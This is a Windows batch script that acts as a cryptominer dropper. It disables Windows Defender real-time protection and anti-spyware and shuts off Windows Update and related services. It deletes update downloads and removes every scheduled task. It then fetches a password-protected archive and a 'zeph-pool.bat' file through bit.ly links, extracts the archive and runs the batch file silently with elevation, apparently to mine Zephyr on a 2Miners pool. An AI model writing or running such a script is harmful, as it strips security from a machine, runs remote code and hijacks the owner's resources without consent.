@echo off
powershell -NoProfile -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1"
powershell -NoProfile -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'SubmitSamplesConsent' -Value 2"
powershell -NoProfile -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate' -Name 'TargetReleaseVersion' -Value 1 -Type DWord"
powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -NoProfile -Command "Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer -Name NoWindowsUpdate -Value 1 -Type DWORD"
powershell -NoProfile -Command "Stop-Service -Name wuauserv -Force"
powershell -NoProfile -Command "Set-Service -Name wuauserv -StartupType Disabled"
powershell -NoProfile -Command "Stop-Service -Name bits -Force"
powershell -NoProfile -Command "Set-Service -Name wuauserv -StartupType Disabled"
powershell -NoProfile -Command "Stop-Service -Name UsoSvc -Force"
powershell -NoProfile -Command "Set-Service -Name UsoSvc -StartupType Disabled"
powershell -NoProfile -Command "Remove-Item -Path C:\Windows\SoftwareDistribution\Download\* -Recurse -Force"
powershell -NoProfile -Command "Get-ScheduledTask | ForEach-Object {Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false}"
powershell -NoProfile -Command "reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoRebootWithLoggedOnUsers /t REG_DWORD /d 1 /f"
powershell -NoProfile -Command "reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update" /v AUOptions /t REG_DWORD /d 2 /f"
powershell -NoProfile -Command "reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f"
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe' -OutFile 'C:\winrar-x64-701.exe'"
powershell -NoProfile -Command "Start-Process -FilePath 'C:\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs"
powershell -NoProfile -Command "Invoke-WebRequest -Uri https://bit.ly/2miners-github -OutFile C:\setup.rar"
powershell -NoProfile -Command "& 'C:\Program Files\WinRAR\WinRAR.exe' x -p2miners -ibck -y 'C:\setup.rar' 'C:\'"
powershell -NoProfile -Command "Start-Sleep -Seconds 8"
powershell -NoProfile -Command "Invoke-WebRequest -Uri https://bit.ly/zeph-pool -OutFile C:\zeph-pool.bat"
powershell -NoProfile -Command "Copy-Item -Path C:\zeph-pool.bat -Destination C:\Setup\Zephyr\zeph-pool.bat -Force"
powershell -NoProfile -Command "Start-Process -FilePath 'C:\Setup\Zephyr\zeph-pool.bat' -ArgumentList '/S' -Verb RunAs"
exit
